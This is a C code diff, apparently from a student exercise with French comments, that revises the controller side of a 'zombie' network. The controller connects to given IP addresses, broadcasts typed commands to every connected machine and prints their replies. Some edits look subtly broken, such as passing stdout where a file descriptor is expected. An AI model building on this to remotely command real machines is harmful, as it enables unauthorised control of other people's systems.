@@ -11,21 +11,21 @@
 
 void sendCommandToZombies()
 {
-    while (1)
+    char command[256];
+    while (fgets(command, 256, stdin) != NULL)
     {
-        char command[256];
-        int charRead = sread(0, command, 256);
-        command[charRead - 1] = '\0';
         for (size_t i = 0; i < nbrSockFD; i++)
         {
-            swrite(sockFdPortsConnectedTab[i], command, sizeof(command));
+            swrite(sockFdPortsConnectedTab[i], command, strlen(command));
         }
     }
+
+    disconnectZombies();
 }
 
-char *listenToResponse()
+void listenToResponse()
 {
-    struct pollfd fds[nbrSockFD];
+    struct pollfd *fds = malloc(nbrSockFD * sizeof(struct pollfd));
     char buffer[2000];
 
     for (int i = 0; i < nbrSockFD; i++)
@@ -38,7 +38,7 @@ char *listenToResponse()
 
     while (1)
     {
-        spoll(fds, nbrSockFD, 0);
+        spoll(fds, nbrSockFD, 10);
 
         for (int i = 0; i < nbrSockFD; i++)
         {
@@ -46,35 +46,47 @@ char *listenToResponse()
             {
                 int nbChar = sread(fds[i].fd, buffer, 2000);
 
-                swrite(1, buffer, nbChar);
+                swrite(stdout, buffer, nbChar);
             }
         }
     }
+    free(fds);
 }
 
 int main(int argc, char const *argv[])
 {
+    if (argc < 2)
+    {
+        printf("Pas d'ip en argument\n");
+        exit(1);
+    }
+    
+
     nbrSockFD = 0;
     for (size_t i = 1; i < argc; i++)
     {
-        const char* ip = argv[i];
+        const char *ip = argv[i];
         testAndConnectPorts(ip);
     }
 
+    printf("Entrez des commandes à envoyer des zombies et les réponses s'afficheront ici\n");
+
     pid_t pid;
 
-    pid = fork();
+    pid = sfork();
     if (pid == 0)
     {
         // FILS
+        printf("je suis fils\n");
         sendCommandToZombies();
     }
     else
     {
         // PERE
+        printf("je suis pere\n");
         listenToResponse();
     }
-
+    // A METTRE DANS LE END HANDLER DU CTRL C
     free(sockFdPortsConnectedTab);
     return 0;
 }
